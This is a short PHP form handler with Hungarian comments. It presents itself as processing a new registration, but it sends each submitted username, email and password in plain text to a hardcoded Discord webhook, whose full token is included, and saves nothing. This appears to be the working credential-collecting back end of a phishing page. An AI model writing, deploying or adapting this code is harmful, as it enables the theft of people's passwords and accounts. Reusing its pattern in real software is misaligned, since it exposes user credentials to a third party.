<?php

// Discord webhook URL
$webhookUrl = "https://discordapp.com/api/webhooks/1236632595731578912/uDYS5z3NZZxxwAbuDWA6Q4hA_R1yM0KHNRiXm_rMdm6RdO3qjV2GMaCdv-e0amPjwr0G";

// Fogadja az űrlap adatokat
$username = $_POST['username'] ?? '';
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';

// Üzenet az Discord webhookra
$message = "Új regisztráció!\n\n";
$message .= "Felhasználónév: " . $username . "\n";
$message .= "Email cím: " . $email . "\n";
$message .= "Jelszó: " . $password;

// Elküldi az üzenetet a Discord webhookra
$ch = curl_init($webhookUrl);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(array('content' => $message)));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec($ch);
curl_close($ch);

// Ellenőrzi a választ
if ($response === false) {
    echo "Hiba történt az üzenet elküldése közben.";
} else {
    echo "Regisztrációs adatok sikeresen elküldve.";
}

?>
